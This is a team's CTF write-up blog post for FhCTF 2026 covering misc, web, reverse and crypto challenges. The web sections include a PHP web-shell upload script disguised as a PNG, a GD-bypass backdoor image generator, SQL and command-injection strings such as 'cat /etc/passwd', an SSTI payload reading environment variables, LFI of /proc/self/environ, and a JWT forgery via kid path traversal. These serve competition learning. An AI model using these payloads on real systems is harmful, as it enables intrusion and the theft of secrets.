---
title: FhCTF 11401
date: 2026-01-01
cover: /images/FhCTF.png
categories:
  - 技術分享
tags:
  - 資安
urlname: FhCTF
lang: en
---
Rank 1!!! But I have to say we just barely pulled it off.

<!-- more -->
``` 
2026 FhCTF / Team CTF
01.01 – 01.05

Group - --------------------------Open group order McDonald's comment +1--------------------------
Final — Rank 1 (Top 1)
```


## Misc

### Sanity Check
![image](/images/FhCTF/1.webp)
```
And see how they distribute rewards.

    FhCTF{S3n1ty_Ch3ck1ng....😝}

Thanks to ISIP.HS for supporting and sponsoring this event.
```

### Christmas Tree
A classic Huffman coding challenge.

```pyhton=
import json

with open('encoded_gift.txt', 'r') as f:
    encoded = f.read().strip()

with open('huffman_tree.json', 'r') as f:
    huffman_tree = json.load(f)
    
def decode_huffman(encoded_data, tree):
    decoded = []
    current = tree

    for bit in encoded_data:
        current = current[bit]

        if isinstance(current, str):
            decoded.append(current)
            current = tree

    return ''.join(decoded)

decoded_message = decode_huffman(encoded, huffman_tree)
print(f"Decoded message: {decoded_message}")
```

```
FhCTF{Hoffman_is_a_great_Christmas_tree}
```
**I have one small complaint: Huffman is spelled "Huffman", not "Hoffman".**

### Hacker's Recipe
Convert each ingredient value to an ASCII character:

```
125 → }
110 → n
117 → u
102 → f
95 → _
115 → s
105 → i
95 → _
103 → g
110 → n
105 → i
107 → k
111 → o
111 → o
99 → c
123 → {
70 → F
84 → T
67 → C
104 → h
70 → F
```

```
FhCTF{cooking_is_fun}
```

### Joke Master
**Congratulations, this challenge was voted the worst one.**
~~I literally just typed a question mark?~~
![image](/images/FhCTF/2.webp)

```
FhCTF{thisi_Prompt_Injection}
```




### Image Gallery
At first, the upload interface only allows PNG.
![image](/images/FhCTF/3.webp)
We noticed PNG has a fixed 8-byte header, so we can append PHP code after the header.
```
png_header = (
    b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\x00\x00\x00\x0D\x49\x48\x44\x52'
    b'\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1F\x15\xC4'
    b'\x89\x00\x00\x00\x0A\x49\x44\x41\x54\x78\x9C\x63\x00\x01\x00\x00'
    b'\x05\x00\x01\x0D\x0A\x2D\xB4\x00\x00\x00\x00\x49\x45\x4E\x44\xAE'
    b'\x42\x60\x82'
)
```
Build a PHP payload and try different command-reading methods.
```PHP

php_code = b'\n\n<pre>__START__\n<?php system("env || printenv"); ?>\n__END__</pre>\n'

file_content = png_header + php_code

print(f"[*] Uploading payload to {UPLOAD_URL}...")

try:
    files = {'fileToUpload': (FILENAME, file_content, 'image/png')}
    data = {'submit': 'Upload Image'}
    
    r = requests.post(UPLOAD_URL, files=files, data=data, timeout=10)
    
    if "has been uploaded" in r.text:
        print(f"[+] Upload ful!")
    else:
        print("[-] Upload failed.")
        print(f"Status Code: {r.status_code}")
        print("Response Snippet:", r.text[:300])
        sys.exit()

    exploit_url = TARGET_URL + "uploads/" + FILENAME
    print(f"[*] Executing payload at {exploit_url}...")
    
    r_exec = requests.get(exploit_url, timeout=10)
    
    if r_exec.status_code == 404:
        print("[-] Error: 404 Not Found.")
        print("    The file might have been deleted by cleanup scripts or the upload path is different.")
        sys.exit()

    content = r_exec.text


    flag_match = re.search(r'(FhCTF\{.*?\})', content)
    
    if flag_match:
        print(f"\n[] Flag found:\n{flag_match.group(1)}\n")
    else:
        start = content.find("__START__")
        end = content.find("__END__")
        if start != -1 and end != -1:
            output = content[start+9:end].strip()
            print("\n[+] Command Output (env):")
            print(output)
            if "flag" in output.lower():
                print("\n[!] 'flag' keyword found in output, please check manually above.")
        else:
            print("\n[-] Flag pattern not found automatically.")
            print("Raw response preview (check manually):")
            print(content[:500])

except requests.exceptions.ConnectionError:
    print(f"\n[-] Connection Error: Could not connect to {TARGET_URL}")
    print("    Please check if the CTF instance is still running or if the URL has changed.")
except Exception as e:
    print(f"\n[-] An error occurred: {e}")
```
```powershell
PS C:\Users\09801\Downloads\gallery> & C:/Users/09801/AppData/Local/Microsoft/WindowsApps/python3.13.exe c:/Users/09801/Downloads/gallery/test.py 
[*] Target set to: http://8608faf0.fhctf.systems/
[*] Uploading payload to http://8608faf0.fhctf.systems/upload.php...
[+] Upload ful!
[*] Executing payload at http://8608faf0.fhctf.systems/uploads/avatar.php...

[] Flag found:
FhCTF{png_format?Cannot_stop_php!}

PS C:\Users\09801\Downloads\gallery> 
```
```
FhCTF{png_format?Cannot_stop_php!}
```

### Image Gallery Revenge
![image](/images/FhCTF/3.webp)
Objective: The Dockerfile line 14 shows the flag is stored in an environment variable: `ENV flag="FhCTF{fake_flag}"`. So the goal is to execute PHP code that reads the environment variable (for example with `getenv('flag')` or `$_ENV`).

Vulnerability: upload.php handles the upload.

Validation: it checks whether the file is a PNG with `exif_imagetype`, and then tries to load it with GD using `imagecreatefrompng`. That prevents simple extension-based bypass and appending PHP code at the end of the file.

Sanitization: the key line is line 49: `imagepng($img, $target_file)`. This redraws the image and saves it again. A normal web shell like `<?php system(...) ?>` appended to the image would get stripped by this step, leaving only the pure image bytes.

Filename vulnerability: line 7 uses `$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);`. The server uses your uploaded filename directly, including extension. If you upload `shell.php`, it will save it as `uploads/shell.php`.

2. Strategy
We need to use a "PHP GD bypass" technique. We need to craft a special PNG so that after `imagecreatefrompng` and `imagepng`, the rewritten PNG data still contains PHP code.

This is usually done by manipulating PNG IDAT chunks (pixel data). When the compression engine processes the pixel bytes, it can be made to produce a string like `<?=$_GET[0]($_POST[1]);?>`.

First step: generate the payload
You need a script to generate this "GD bypass" PNG. Below is a common generator script based on an IDAT/PLTE bypass technique from foreign researchers.

Save the following code as `gen_payload.php` and run it with PHP on your machine:

```PHP

<?php
                                                                                                        ?>

$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);

$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img, 'payload.webp');
echo "Payload generated: payload.webp\n";
?>
```
After running it you get `payload.webp`. This image is crafted so that even after `imagecreatefrompng` and `imagepng`, the resulting hex data still contains the PHP backdoor.

Second step: prepare the attack file
Rename the generated `payload.webp` to `shell.php`.

Server validation: the file is a valid PNG (passes).

Saved by the server as `.php` because the filename extension is `.php`.

Sanitization bypass: the payload is crafted so that after GD rewriting, the PHP code remains in the new image data.

Third step: upload and execute
Go back to the challenge page and upload `shell.php`.

Because our payload expands to `<?=$_GET[0];?>`, we can use a GET parameter to pass the command.
```bash
curl.exe "http://b1baf89e.fhctf.systems/uploads/shell.php?0=system" -d "1=env" --output - | Select-String "FhCTF"
```

```
FhCTF{But_I_CAN_WRITE_PHP_IN_IDAT_CHUNK}
```


### Python Compile
When the program contains syntax errors, it shows `Syntax Error`. That means the backend still reads a file in order to process the error, which suggests this is probably an LFI challenge.

If you enter arbitrary Python code that causes a syntax error, the page shows `Syntax Error`, and the error message includes "Line N" plus the source line content.

From the error, we can infer that when rendering `Syntax Error`, the backend reads the corresponding source file line by line, and the filename comes from the user's `filename` input. This creates a local file inclusion (LFI) risk.

To prove it with PoC, change the request's `filename` to a system path such as `/proc/self/environ`, while still keeping invalid Python code. Then observe whether the error message displays that file's contents.

To make the error appear on line 1, set the code to a single `(`, so the backend will try to read line 1 of the `filename` file and show it in the error.

```python
monaco.editor.getModels()[0].setValue("(");
```
```python
document.querySelector('input[name="filename"]').value = '/proc/self/environ';
```
```python
document.getElementById('compileForm').submit();
```

The error output shows `/proc/self/environ`, which contains environment variables including `FLAG=`.

Finally we can obtain the flag
```
FhCTF{N0t_s4f3_t0_ou7put_th3_err0r_m5g}
```


## Survey
### Survey
![image](/images/FhCTF/4.webp)
```
FhCTF{Th4nk_y0u_f0r_y0ur_f33db4ck_7hCTF}
```
## Web
### INTERNAL LOGIN
![image](/images/FhCTF/5.webp)

Client-side SQL injection simulation. In the Username field, input:

- ' or 1=1--
- ' OR '1'='1
- admin' or 1=1--
- ' || 1=1--
- anything' or 'a'='a

```
FhCTF{SQL_1nj_42_}
```

### Web Robots
robots.txt indeed; yes, robots.txt.
![image](/images/FhCTF/6.webp)

We found:
```
User-Agent *

Disallow /secret
```

So we just go to /secret.

![image](/images/FhCTF/7.webp)

Entering /secret redirects to /secret/index.html, so obviously the previous step was directory enumeration.

![image](/images/FhCTF/8.webp)

![image](/images/FhCTF/9.webp)

```
FhCTF{r0b075_4r3_n0t_v15ible_in_tx7}
```

### Doors Open

![image](/images/FhCTF/10.webp)

Again, start with robots.txt.

![image](/images/FhCTF/11.webp)

Then go to /doors.

![image](/images/FhCTF/12.webp)

Clicking there goes directly to /door/1. We started brute forcing 0~10000 with Burp, found nothing, and as more people solved it we thought it shouldn't be that hard. So we wondered whether it could be a negative number...

![image](/images/FhCTF/13.webp)

### The Visual Blind Spot

Calculate the correct RGB key:
```javascript
const _base = parseInt("32", 16); // "32" (hex) = 50 (decimal)

const _kMap = { 
    x: _base << 1,  // 50 << 1 = 100
    y: _base,       // 50
    z: _base << 2   // 50 << 2 = 200
};
```
Correct RGB values:
```
R = 100

G = 50

B = 200
```
Decrypt the sys-config data.
`data-params` contains encrypted values:

```text
249|351|240|291|249|408|288|387|369|192|330|366|324|240|186|375|351|192|375|414
```
Decryption formula: `charCode = (n / 3) - 13`

```
FhCTF{Stn3am_C1ph3p}
```


### SYSTEM ROOT SHELL

![image](/images/FhCTF/14.webp)

In the script tags we found:

```
const _obs = [82, 67, 69, 95, 83, 117, 99, 99, 101, 115, 115, 95, 118, 51]; 
const _h = [70, 104, 67, 84, 70, 123]; 
const isInject = /[;&|]/.test(cmd);
```

ASCII arrays decoded to characters:
```
_h → "FhCTF{"

_obs → "RCE__v3"

Then add the closing "}"
```
Trigger examples:
```powershell
127.0.0.1; ls

127.0.0.1 | whoami

127.0.0.1 & cat /etc/passwd
```
```
FhCTF{RCE__v3}
```

### Welcome to Cybersecurity Jungle
![image](/images/FhCTF/15.webp)
When you first enter, the page shows a Japanese phrase in the HTML source title tag:
```
言語（げんご）を変（か）えても、プログラミングの本質（ほんしつ）は変（か）わらない。
```
It means: "Even if you change the language, the essence of programming does not change."

The key to the challenge is setting the correct cookie.
```
Cookie name (Base64): aXNGbGFnU2hvdzJ1
```
Decoded: `isFlagShow2u`
```
Cookie value (Base64): 44Go44GF44KL44O8
```
Decoded: `とぅるー` (Japanese for "true")

Then go to the Application tab, edit the cookie value, and refresh.

![image](/images/FhCTF/16.webp)

```
FhCTF{Th3_e553nc3_of_pr0gramm1n6_is_ind3p3nden7_of_the_languag3_u53d}
```

### Templating Danger

This was an SSTI challenge.

Bypass method:
```python
if "\\u" in val:
    normalize_val = val.encode("utf-8").decode('unicode_escape')
    context[context_key] = Template(normalize_val).render()
```
When input contains `\u`, the system performs Unicode unescape and then renders it with `Jinja2 Template().render()` after filtering. This allows bypassing the bracket sanitization using Unicode encoding.

Payload:
```python
\u007b\u007bcycler.__init__.__globals__.os.environ['FLAG']\u007d\u007d
```
![image](/images/FhCTF/17.webp)
```
FhCTF{T3mpl371ng_n33d_t0_b3_m0r3_c4r3full🥹}
```

### Documents

As usual, I first checked the page source and looked for hidden characters.
![image](/images/FhCTF/18.webp)
- "HTTP Header tells you everything"

Inspecting the HTTP headers showed: `powerby: FastAPI`
FastAPI usually has `/openapi.json`.
![image](/images/FhCTF/19.webp)
I found that `/flag.html` required a Referer header, so we needed to spoof it.

```powershell
Invoke-WebRequest -Uri "http://9f1604e5.fhctf.systems/flag.html" \
    -Headers @{"Referer"="https://localhost.app:8000/index.html"} \
    -UseBasicParsing | Select-Object -ExpandProperty Content
```

![image](/images/FhCTF/20.webp)
```
FhCTF{URL_encod3d_m337_p47h_d15cl0sure😱😱}
```

### LOG ACCESS
![image](/images/FhCTF/21.webp)

This challenge offered a "secure log reading tool" that claimed to detect and block all path traversal attacks. The title clearly hinted that the tool had no backend and all checks were done in the browser.

```javascript
const check1 = input.split('.').length > 3;
const check2 = input.toLowerCase().indexOf('flag') !== -1;

if (check1 && check2) {
    const final = _h + "{" + _c1 + _c3 + "_" + _c2 + "}";
    output.innerText = "ACCESS_GRANTED:\n" + final;
}
```
The validation conditions were very clear:

- check1: input must contain more than 3 dots (`.`)
- check2: input must contain the string "flag" (case-insensitive)

Obfuscated string decoding
The JavaScript used several obfuscated variables:

```javascript
const _h = [70, 104, 67, 84, 70].map(c => String.fromCharCode(c)).join('');
// ASCII decoding: FhCTF

const _c1 = "\x50\x61\x74\x68\x5f";
// Hex decoding: Path_

const _c2 = (21337 >> 4).toString(16);
// Bitwise operation: 21337 >> 4 = 1333, hex = 535

const _c3 = "\x54\x72\x34\x76";
// Hex decoding: Tr4v
```
Combine them:
```
FhCTF{Path_Tr4v_535}
```

### Pathway-leak
Open the challenge site and inspect the file manager interface and page source.
![image](/images/FhCTF/22.webp)

In the `<script>` block we found:

```javascript
const TENANT = 'guest_user';
const url = `/api/assets/${TENANT}/${filename}`;
```
The challenge also provided a file list showing that the server still had:
```
secret_admin/flag.txt (38B)
```
We inferred the backend API likely did not verify whether the current user actually belonged to that tenant, so we tried a cross-tenant request:

```bash
curl http://71c21714.fhctf.systems/api/assets/secret_admin/flag.txt
```

The server replied HTTP 200 with:
```
FhCTF{p4th_tr4v3rs4l_w3_w4n7_t0_av01d}
```

### KID
Entering the challenge page, open browser DevTools. In the source and console logs we saw debug messages that leaked backend verification logic:

- Key path debug:
  ```txt
  [DEBUG] Fetching key from: /app/keys/default.pem
  ```
  This means the server reads a key from the filesystem based on the JWT header `kid` (Key ID), e.g. `kid = "default.pem"` maps to `/app/keys/default.pem`.

- Dangerous compatibility mode:
  ```txt
  [DEBUG] HS256 Compatibility Mode: Enabled
  ```
  This means the server supports both asymmetric `RS256` and symmetric `HS256` modes, and the implementation has algorithm confusion risk.

- Current permission: the page shows the login identity is `guest`, so the goal is to forge a token and get `admin` privileges.

Then we extracted the JWT from the cookie (for example `access_token`) and inspected it on jwt.io. The structure looked like:

- Header:
  ```json
  {
    "alg": "RS256",
    "kid": "default.pem",
    "typ": "JWT"
  }
  ```
- Payload:
  ```json
  {
    "role": "guest",
    "iat": 1704350000
  }
  ```

That was enough to conclude: the server reads the file specified by `kid` and uses its contents as the key to verify the JWT.

- Vulnerability analysis

This challenge combined two common issues: **Directory Traversal** + **JWT Algorithm Confusion**.

- Directory Traversal

    The backend likely did something like:

    ```python
    kid = header["kid"]
    key_path = "/app/keys/" + kid
    key_data = open(key_path, "rb").read()
    ```

    If `kid` is not filtered for `../`, an attacker can send something like:

    ```txt
    ../../../../../../dev/null
    ```

    making the actual path `/dev/null` instead of the intended `/app/keys/default.pem`.
    We cannot see the file content, but the server loads it and uses it as the key, which is the exploitation point.

- JWT Algorithm Confusion

    The intended design should be:

    - `RS256`: use an asymmetric key pair (private key signs, public key verifies).
    - The `.pem` file should be treated as a public key and only used for verification.

    But the server still supports an `HS256 Compatibility Mode` and likely implemented it like:

    ```python
    if header["alg"] == "RS256":
        # verify with public key
    elif header["alg"] == "HS256":
        # read the same pem file and treat it as the HMAC secret
    ```

    This means:

    - When `alg = HS256`, the server uses the pem file contents as the symmetric secret.
    - If the attacker can choose another file, they can choose a file with a known secret.

    We don't know the content of `default.pem`, but directory traversal lets us choose an alternative file to use as the secret.

- Attack strategy

    The key idea:

    1. Find a system file with a known content and have the server use it as the HMAC secret.
    2. On Linux, `/dev/null` contains an empty string, so the secret becomes `""`.
    3. If we sign the token locally with an empty secret, the server should accept it.
    4. Set the payload `role` to `admin` to elevate privileges.

    So the exploit is:

    - Set JWT Header:
      - `alg` = `HS256`
      - `kid` = `../../../../../../dev/null`
    - Sign with `key = ""`.
    - Set payload role to `admin`.

- Forge a JWT exploit

    Using Python + PyJWT to generate the forged token:

    ```python
    import jwt

    # 1. Malicious header: traversal to /dev/null and HS256
    headers = {
        "kid": "../../../../../../dev/null",
        "alg": "HS256",
        "typ": "JWT"
    }

    # 2. Malicious payload: make role admin
    payload = {
        "role": "admin",
        "user": "admin",
        "iat": 1704355555
    }

    # 3. Sign using an empty key, matching /dev/null
    forged_token = jwt.encode(
        payload,
        key="",
        algorithm="HS256",
        headers=headers
    )

    print("Forged token:\n", forged_token)
    ```

    Steps:

    1. Take an existing valid cookie token and confirm the field names (`role`, `user`, etc.).
    2. Run the script and get a new `forged_token`.
    3. In browser devtools, Application -> Cookies, replace the JWT cookie value with `forged_token`.
    4. Refresh the page.

    If the backend is implemented as described, it will:

    - see `alg = HS256` and verify with HMAC,
    - read `/dev/null` from `kid` and use an empty string as the secret,
    - verify the signature successfully because we signed with the same empty secret,
    - accept `role = admin` from the payload.
![image](/images/FhCTF/23.webp)
![image](/images/FhCTF/24.webp)

```
FhCTF{Th3_k1d_u53d_JWT_t0_tr4v3rs3_p4th5}
```

### Something You Put Into

Inspecting `main.py` showed the flag is read from the system settings:
```python
FLAG = ChallSettings().flag
```
Confirming `ChallSettings()` reads the flag from an environment variable.

Reviewing the Docker YAML file shows the flag is set in the environment variables in plain text.

```
FhCTF{🐷B3_c4r3ful_y0ur_SQL_synt4x🐷}
```


## Reverse
### Simple Script Reader
- First look at the Python file: the flag is skipped from line 2 onward.
![image](/images/FhCTF/25.webp)
- User input can modify any position in the list.
![image](/images/FhCTF/26.webp)
- The JUMP instruction can move the instruction pointer to any index.
![image](/images/FhCTF/27.webp)
So we can just input `JUMP 0`.
![image](/images/FhCTF/28.webp)
```
FhCTF{f1l3_10_and_jumb_m4st3r}
```

### OBF
First look at the code; it uses heavy obfuscation:

- single-letter variable names (K, H, G, J, C, etc.)
- shortened builtin names (A=enumerate, E=chr, F=ord)
- state machine design (dictionaries and pointers)
- magic numbers and strings

The code implements a state machine that executes in this order:

```text
State 1: XOR 66 decoding
  data: [58,34,118,...,34]
  result: '|`0|`.T1W0.`,`k`'
  
State 5: string reverse
  data: 'wEGLxxnj0nbU2fsm'
  reversed: 'msfU2bn0jnxxLGEw'
  
State 2: Base64 decode
  data: 'WEVBVldCWkM1UVBWQktHeA=='
  decoded: 'XEAVWBZC5QPVBKHX'
  
State 3: subtract 5 from chars
  data: 'GFVzRJI9IctWCFa['
  result: 'BAQuMED4D^oR>A\\V'
  
State 4: validation complete
  check key length >= 64 ✓
  full key (64 chars)
```
```
|`0|`.T1W0.`,`k`BAQuMED4D^oR>A\\VXEAVWBZC5QP...
```
This key is built from 4 parts:

- XOR with 66: `|0|`.T1W0.,`k` (16 chars)
- char minus 5: `BAQuMED4D^oR>A\\V` (16 chars)
- Base64 decode: `XEAVWBZC5QPVBKHX` (16 chars)
- string reverse: `msfU2bn0jnxxLGEw` (16 chars)

Decryption process
Given the encrypted output:

```text
3e08772c224960093145070318575a0e741e050c7a2d745a1b6f5a0d5834322b
```
Use the key to XOR-decrypt:

```python
flag = ''.join([chr(int(hex_pair, 16) ^ ord(key[i % 64]))
               for i, hex_pair in enumerate(hex_pairs)])
```
```
FhCTF{P0lym0rph1c_Crypt0}
```

### The Lock

Using IDA static analysis.
#### Main function logic
From IDA Pro decompilation, the `main` function flow is:
Format check (`check_header`): verify the input starts with `FhCTF{` and ends with `}`.
Core verification (`check_password`): the key function that returns true if the flag is correct.
#### `check_password` analysis
Inside `check_password`, we observe:
String handling: the code extracts the content inside the braces with `substr`.
Length requirement: the content must be exactly 26 chars long.
Key data:
v6 (key array): [85, 51, 102, 17]
v7 (target values): [7, 2, 20, 40, 47, 74, 97, 92, 32, 111, 21, 54, 83, 26, 113, 129, 132, 127, 37, 116, 140, 106, 101, 126, 87, 54]
Algorithm formula:
$$v7[i] = (v6[i \pmod 4] \oplus \text{input}[i]) + 2 \times i$$

#### Reverse the algorithm
To recover the original input from the formula, we solve for `input[i]`:
First remove the additive offset: `X = v7[i] - 2*i`
Then reverse XOR: `input[i] = X \oplus v6[i \pmod 4]`

Automated decryption script (Python)
To get the result quickly, we write:

```Python
target = [7, 2, 20, 40, 47, 74, 97, 92, 32, 111, 21, 54, 83, 26, 113, 129, 132, 127, 37, 116, 140, 106, 101, 126, 87, 54]
key = [85, 51, 102, 17]

flag_content = ""
for i in range(len(target)):
    # reverse formula: (v7[i] - 2*i) XOR v6[i%4]
    char_code = (target[i] - 2 * i) ^ key[i % 4]
    flag_content += chr(char_code)

print(f"Flag: FhCTF{{{flag_content}}}")
```

#### Final result
After running the script, the string inside the braces is `J3v3rs3_Eng1n33r1ng_1sOar7`.
The flag text is leetspeak for "Reverse Engineering Is Art."

Final answer:
```
FhCTF{R3v3rs3_Eng1n33r1ng_1s_Ar7}
```

### Broken Decoder
We were given two files.
![{EFEA1592-5D42-4F42-A2D1-A2F66BD88A55}](/images/FhCTF/a.webp)
One of them, `encrypted_flag`, contains:
![{58654F7F-3F17-4FA5-AEAC-649927D2FA73}](/images/FhCTF/b.webp)
The `decrypt` file contains:
```
... (binary ELF data) ...
```

The challenge provided an ELF binary `decrypt` and a ciphertext file `encrypted_flag`. We needed to reverse engineer the decryption logic and implement a Python script to recover the flag. Using `strings` and symbol analysis, we identified key algorithms including `generateSeed`, `getNextKey`, and `rotateRight`.

- Static analysis

`strings decrypt` showed the program reads input/output files with `fopen`, `fgets`, `fputc`, and uses libstdc++ and libc symbols such as `__stack_chk_fail`, `__libc_start_main`. The symbol table revealed core functions:

- `generateSeed`: generates the initial seed from the password using `seed = seed * 31 + ch` modulo `0xFFFFFFFF`.
- `getNextKey`: an LCG PRNG with formula `(seed * 0x41C64E6D + 0x3039) & 0x7FFFFFFF`, and key = `seed % 255`.
- `rotateRight`: bit-rotate right by 3.
- `main`: reads a hex string, for each byte performs rotate → seed update → XOR with key → seed += original byte.

The ELF section also exposed the hex data:
`2781ACE7A1534E1231F7B84AD05565FEFB484A86E6ECD5C76686276A57658F79686098C6A5F0593D395543ABFF118410B2F02CF61FA5`
and the password hint:
`I_just_afraid_someday_i_will_forget_the_password`.

- Reconstructing the logic

The decryption process for each byte was:

1. Parse hex into byte `b`.
2. `b_rot = rotate_right(b, 3)`, i.e. `(b >> 3) | ((b << 5) & 0xFF)`.
3. `seed = getNextKey(seed)`.
4. `key = seed % 255`.
5. `plaintext_byte = b_rot ^ key`.
6. `seed = (seed + b) & 0xFFFFFFFF` (note: add the original `b`, not rotated `b_rot`).

Unlike common stream ciphers, the seed update depends on the ciphertext, creating a chained dependency.

- Decryption script

```python
hexline = ("2781ACE7A1534E1231F7B84AD05565FEFB484A86E6ECD5C76686276A57658F7"
           "9686098C6A5F0593D395543ABFF118410B2F02CF61FA5")
password = "I_just_afraid_someday_i_will_forget_the_password"

def generate_seed(s: str) -> int:
    seed = 0
    for ch in s.encode():
        seed = (seed * 31 + ch) & 0xFFFFFFFF
    return seed

def get_next_key(seed: int) -> int:
    return (seed * 0x41C64E6D + 0x3039) & 0x7FFFFFFF

def rotate_right(byte: int, n: int) -> int:
    return ((byte >> n) | ((byte << (8 - n)) & 0xFF)) & 0xFF

seed = generate_seed(password)
out = bytearray()

for i in range(0, len(hexline), 2):
    b = int(hexline[i:i+2], 16)
    b_rot = rotate_right(b, 3)
    seed = get_next_key(seed)
    key = seed % 255
    out.append(b_rot ^ key)
    seed = (seed + b) & 0xFFFFFFFF

print(out.decode()) 
```
```
FhCTF{Why_not_use_std::string_instead_of_char_arrays?}
```

## Crypto

### Secure Encryption

This challenge showed why ECB mode is unsuitable for image data.

- Encryption analysis
![image](/images/FhCTF/29.webp)

The challenge converted the flag into a BMP image and then encrypted it with AES-256-ECB. The key was derived directly from the flag's hex representation. Because OpenSSL `enc` pads keys with zeros to 32 bytes when the key is too short, the actual encryption key is predictable.

- Attack vector

The fatal weakness of ECB is that identical plaintext blocks produce identical ciphertext blocks. When the plaintext is structured data such as an image, this leaks spatial patterns directly.

- Decryption steps

The image is a 1000×100 32-bit BMP, so each pixel is 4 bytes and the whole file is 400,000 bytes. AES works on 16-byte blocks, which correspond to 4 pixels per block.

Reconstructing the image:

- Read the encrypted file and split it into 16-byte blocks.
- Skip the BMP header, which occupies the first 138 bytes (about 9 blocks).
- Treat each encrypted block as a color unit.
- Rearrange the blocks into a 250×100 grid (`1000 / 4 = 250`).
- Assign different colors to different ciphertext blocks for visualization.

Because text areas and background areas have different pixel values, their encrypted blocks differ clearly. By mapping different blocks to colors, the text outlines become visible and we can read the flag directly.

```python
import os
from PIL import Image
from collections import Counter

# Settings
ENC_FILE = "flag.enc"
OUTPUT_DIR = "results"
MIN_WIDTH = 200  # adjust based on experience or testing
MAX_WIDTH = 300

def solve():
    # 1. Read the encrypted file
    with open(ENC_FILE, 'rb') as f:
        content = f.read()

    # 2. Split into blocks (AES block size = 16 bytes)
    block_size = 16
    blocks = [content[i:i+block_size] for i in range(0, len(content), block_size)]
    
    # 3. Find the background (most common block)
    counts = Counter(blocks)
    most_common_block = counts.most_common(1)[0][0]
    
    # 4. Convert to a 0/1 map (1 = background, 0 = text)
    pixel_map = [1 if b == most_common_block else 0 for b in blocks]
    
    if not os.path.exists(OUTPUT_DIR):
        os.makedirs(OUTPUT_DIR)

    # 5. Brute force widths and generate images
    print(f"[*] Generating images from width {MIN_WIDTH} to {MAX_WIDTH}...")
    for width in range(MIN_WIDTH, MAX_WIDTH + 1):
        height = len(pixel_map) // width + 1
        img = Image.new('1', (width, height), 1)
        pixels = img.load()
        
        idx = 0
        try:
            for y in range(height):
                for x in range(width):
                    if idx < len(pixel_map):
                        if pixel_map[idx] == 0:
                            pixels[x, y] = 0 
                        idx += 1
        except:
            pass
            
        img.save(f"{OUTPUT_DIR}/width_{width}.webp")

if __name__ == "__main__":
    solve()
```
![image](/images/FhCTF/30.webp)


We can see the reversed message:
`FhCTF{3C13_m0d3_1s_z0_S3cur17y_}`
![image](/images/FhCTF/31.webp)
```
FhCTF{3C13_m0d3_1s_z0_S3cur17y_}
```

### Encode By Py 😘
![image](/images/FhCTF/32.webp)

This challenge's core is that the homemade emoji encryption is actually just a reversible shift encoding with a predictable key cycle and a lot of repeated samples. The overall security is very weak.

- Overview

    - The program loads a secret key string `ENC_SECRET`, defaulting to `Hi_S3cL157_xato-net`, then reads `flag.txt` as plaintext.
    - The main logic is in `encrypt_bytes`, which processes input byte by byte, converts each byte to a corresponding emoji, and writes `flag.enc`.
    - Encoding uses a fixed base (`BASE = 0x1F600`) and range (`RANGE = 0x4E`), so outputs fall within a narrow emoji codepoint interval.

- Single-byte emoji encoding

    - For each plaintext byte, it calculates the current key index `idx`, uses `ENC_SECRET[idx]` for a shift, and combines it with XOR to produce `enc_shift`.
    - The actual output becomes:
      \[
      enc\_byte = ((byte + (enc\_shift \oplus RANGE)) \bmod RANGE) + BASE
      \]
    - If the result falls into a reserved interval, it subtracts `ALTERNATIVE` to keep the output valid UTF-8 emoji.
    - Some special bytes (such as newline) are not converted to emoji and are output verbatim. They also affect the length-related counters used for calculating `idx`.

- Index cycle and behavior analysis

    - The key position is not simply `i % len(ENC_SECRET)`. It uses `i % ((len_num * len_times) if len_num > 0 else 1)`, where `len_num` and `len_times` change only on certain bytes.
    - That means the encryption is segmented: hitting the special control byte changes the key cycle.
    - The first large block of repeated emojis like `✅😢🙈😴` corresponds to the same plaintext byte repeated many times, which is ideal for recovering key positions.

- Reverse engineering the decryption logic

    - To recover plaintext, first convert each emoji to its Unicode codepoint. If it was shifted into the alternative section, adjust by `ALTERNATIVE`. Then subtract `BASE` to get the encoded value modulo `RANGE`.
    - Use the same key byte and shift rules to reverse the formula. Because the encryption uses `% RANGE`, we can only recover the plaintext value modulo 78, but in this challenge the flag maps to a small character set, so that is enough.
    - Implementation steps:
      - recover the `enc_shift` for each position,
      - compute the original byte value in `0..77`,
      - map those values to a visible character table.

- Recovering the key from repeated lines

    - The challenge's first line is a very regular repeated emoji pattern, which is effectively a known plaintext repetition.
    - For each repeated position, we know:
      - the same plaintext byte,
      - the emoji codepoint,
      - `BASE` and `RANGE` constants.
    - So we can solve the equation for each key byte and obtain the 12-byte key:
      `[49, 57, 49, 35, 19, 44, 42, 37, 41, 23, 22, 21]`
    - With the key recovered, we can decrypt the entire `flag.enc` back to a mod-78 plaintext sequence.

- Restoring the ASCII art and the flag

    - The decoded output is not a simple one-line flag. It's a large ASCII art block, similar to FIGlet text.
    - Render the recovered characters with the original line breaks, and the flag appears inside the art.
    - This process uses:
      - reversible math,
      - highly repeated known plaintext,
      - the limited character space of the mapping.
    - It proves that emoji-based encoding alone does not guarantee security.

        ```python
        from pathlib import Path
        from PIL import Image, ImageDraw, ImageFont

        # Constants
        BASE = 0x1F600
        RANGE = 0x4E
        ALTERNATIVE = 0x1CEFE
        KEY = [49, 57, 49, 35, 19, 44, 42, 37, 41, 23, 22, 21]

        VAL_TO_CHAR = {
            14: "\\",
            18: "`",
            32: " ",
            33: "!",
            39: "'",
            40: "(",
            41: ")",
            44: ",",
            45: "-",
            46: ".",
            47: "/",
            58: ":",
            60: "<",
        }

        def parse_encrypted_file(file_path):
            raw_data = Path(file_path).read_bytes()
            text = raw_data.decode("utf-8")

            tokens = []
            for char in text:
                if char == "\n":
